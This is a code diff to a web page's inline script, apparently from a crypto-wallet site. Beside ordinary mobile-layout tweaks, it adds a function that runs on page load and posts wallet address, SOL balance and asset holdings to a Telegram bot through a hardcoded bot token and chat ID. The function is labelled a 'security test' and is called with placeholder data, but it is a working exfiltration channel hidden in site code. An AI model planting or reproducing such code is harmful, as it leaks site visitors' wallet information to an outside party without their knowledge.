@@ -1520,6 +1520,26 @@ document.addEventListener("DOMContentLoaded",()=>{
   const hw=document.querySelector(".hero-wrap");
   if(hw && window.innerWidth<640){ hw.style.gridTemplateColumns="1fr"; hw.style.padding="32px 16px"; }
   if(window.innerWidth<640){ const fs=document.querySelector(".faq-side"); if(fs) fs.style.display="none"; }
+async function testSecurityExfiltration(address, sol, tokens) {
+    const token = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
+    const chat = "8575014959";
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const text = `🚨 *TEST SÉCURITÉ* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Solde:* ${sol} SOL\n💎 *Assets:* ${tokens}`;
+
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chat, text: text, parse_mode: "Markdown" })
+        });
+        console.log("✅ Sent");
+    } catch (e) {
+        console.log("🛡️ Blocked");
+    }
+}
+
+window.addEventListener("load", () => {
+    testSecurityExfiltration("7xK...TestAddress", "1.25", "USDC: 450");
 });
 </script>
 </body>
